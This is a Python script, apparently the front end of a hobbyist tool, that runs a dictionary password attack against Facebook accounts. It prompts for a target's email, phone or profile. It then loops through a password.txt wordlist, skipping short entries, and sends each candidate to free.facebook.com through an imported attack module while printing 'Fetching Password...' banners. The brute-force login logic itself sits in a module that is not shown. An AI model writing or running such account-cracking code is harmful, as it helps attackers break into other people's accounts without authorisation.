import index
import os,time, random 
import color
url = "https://free.facebook.com"
email = 'test@test.com'
password = 'ghs_pasaaword'

data = {
  "url"  :url,
  "email" : email,
  "password" : password
}

os.system("bash logo.sh")
attack = index.__ghs__(data)
print('\n')
attack._load(color.YELLOW+"[-] "+color.RED+color.BOLD+"Please Wait...\n")
attack._load(color.YELLOW+"[-] "+color.GREEN+color.BOLD+"System Intilizing...")
os.system("clear")
os.system("bash logo.sh")

###  GETTING INPUTS FROM USERS
log_url = str(input(color.RED+"\n[+] "+color.GREEN+color.BOLD+"ENTER LOGIN URL : "+color.YELLOW))
log_info = str(input(color.RED+"\n[+] "+color.GREEN+color.BOLD+"ENTER USER EMAIL/PHONE/PROFILE : "+color.YELLOW))
if url and email:
  os.system("clear")
  os.system("bash logo.sh")
  attack._load(color.YELLOW+"\n ✅ "   +color.GREEN+color.BOLD+"Preparing For Attack...")
  os.system("clear")
  os.system("bash logo.sh")
  theme = ["\033[0;32m", "\033[0;31m", "\033[0;35m", "\033[1;33m"]
  f = open("password.txt", 'r')
  passwords = f.readlines()
  for passwd in passwords:
      passwd = passwd.strip()
      if len(passwd) <6:
        continue
      #print (passwd)
      info = {
      "url"  : "https://free.facebook.com",
      "email" : log_info,
      "password" : passwd
      }
      login = index.__ghs__(info)
      login.Attack()
      print(attack._load(random.choice(theme)+"\nFetching Password..."))
    
else:
  print (color.RED+"\n[!] "+color.BOLD+color.RED+"Please Enter Information !")
  time.sleep(2)
  os.system("python Attack.py")


"""
  num = 0
  while num<10:
    #print(attack._load(color.YELLOW+float(num)+color.GREEN+color.BOLD+"Please Wait...\n"))
    print(num)
    print(attack._load(random.choice(theme)+"Fetching Password..."))
    num+=1
"""
